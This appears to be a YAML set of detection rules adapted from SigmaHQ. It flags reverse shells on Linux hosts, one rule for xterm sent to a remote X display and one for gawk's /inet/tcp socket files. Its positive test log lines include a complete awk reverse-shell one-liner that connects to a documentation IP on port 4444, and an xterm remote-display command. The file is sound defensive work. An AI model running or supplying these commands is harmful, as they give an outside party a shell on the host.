- id: mention.revshell_xterm_remote_display
  title: 'xterm -display with a remote IP display'
  match:
    anchored: 'xterm {1,3}-display {1,3}[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,2}'
  case_sensitive: false
  strength: medium
  attack: [T1059.004]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Potential Xterm Reverse Shell (@d4ns4n_)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_xterm_reverse_shell.yml
    license: DRL-1.1
    upstream_id: 4e25af4b-246d-44ea-8563-e42aacab006b
  rationale: >-
    Sending an xterm to an X server at an IP address gives that server a shell on this host. Remote X sessions to a
    workstation are rare but legitimate, so it is medium; a local display (127.0.0.1:0) also matches and is the known
    benign case.
  examples:
    positive:
      - 'Nov 20 10:31:00 web01 bash[5163]: HISTORY: xterm -display 203.0.113.7:1'
    negative:
      - 'Nov 20 10:31:01 web01 bash[5164]: HISTORY: xterm -display :0'
      - 'Nov 20 10:31:02 web01 bash[5165]: HISTORY: xterm -display ws01.corp.example.org:0'

- id: mention.revshell_gawk_inet_tcp
  title: gawk network special file
  match:
    literal: ['/inet/tcp/0/', '/inet/udp/0/']
  case_sensitive: false
  strength: strong
  attack: [T1059.004, T1095]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Suspicious Reverse Shell Command Line (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
    license: DRL-1.1
    upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
  rationale: >-
    Generalizes the rule's awk keyword 'BEGIN {s = "/inet/tcp/0/': gawk's /inet/tcp/0/host/port special file opens a
    client socket, which the awk reverse shell uses. Real gawk networking scripts are very rare on servers.
  examples:
    positive:
      - 'Nov 20 10:32:00 web01 bash[5166]: HISTORY: awk ''BEGIN {s = "/inet/tcp/0/203.0.113.7/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'' /dev/null'
      - 'Nov 21 09:00:17 web01 bash[4100]: HISTORY: gawk ''BEGIN {s = "/inet/udp/0/203.0.113.7/53"; print "x" |& s}'''
    negative:
      - 'Nov 20 10:32:01 web01 bash[5167]: HISTORY: awk ''{print $1}'' /var/log/nginx/access.log'
      - 'Nov 20 10:32:02 web01 bash[5168]: HISTORY: cat /proc/net/tcp | awk ''{print $2}'''
